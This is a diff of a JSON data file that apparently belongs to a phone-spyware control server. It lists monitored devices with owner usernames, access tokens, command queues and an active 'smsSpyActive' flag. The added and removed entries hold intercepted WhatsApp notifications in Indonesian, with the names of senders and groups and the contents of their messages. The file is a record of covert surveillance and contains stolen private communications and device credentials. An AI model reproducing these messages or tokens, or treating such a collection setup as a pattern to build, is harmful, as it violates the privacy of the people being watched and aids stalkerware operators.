@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "74be2827eaa044a7872739b517404413",
-    "lastSeen": 1776768971695,
+    "lastSeen": 1776768974679,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T08:57:06.800Z",
@@ -20,6 +20,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎44 pesan dari 27 chat",
+        "time": "21/04 18:56",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776768972148
+      },
       {
         "appName": "WhatsApp",
         "sender": "HAIDIR hk",
@@ -5483,6 +5491,14 @@
     "smsMessages": [
       {
         "appName": "WhatsApp",
+        "sender": "‎STOCK¹ NEW DAVID 18 STR X OWN (443 pesan): ~ Agung",
+        "content": "📷 NEXT SIS P TAWARIN STOK LAGI",
+        "time": "21/04 17:56",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776768976126
+      },
+      {
+        "appName": "WhatsApp",
         "sender": "WhatsApp",
         "content": "‎‎2741 pesan dari 18 chat",
         "time": "21/04 17:55",
@@ -9472,14 +9488,6 @@
         "time": "21/04 17:27",
         "pkg": "com.whatsapp",
         "receivedAt": 1776767278006
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎JB || MANZZ KALBAR (910 pesan): ~ rai",
-        "content": "📷 800 || Max 4 otw 5 dm utuh 50 mb on 10day v gagah rebindku",
-        "time": "21/04 17:27",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776767277956
       }
     ],
     "galleryPhotos": [],
@@ -9498,7 +9506,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776768970597,
+    "lastSeen": 1776768975718,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -9539,7 +9547,7 @@
     "deviceName": "HP-SISKA_TAMA-3F6F",
     "ownerUsername": "Ubill_raa",
     "token": "e308898150127caeca3b2487066a87c8",
-    "lastSeen": 1776768970942,
+    "lastSeen": 1776768973940,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T10:19:21.483Z",
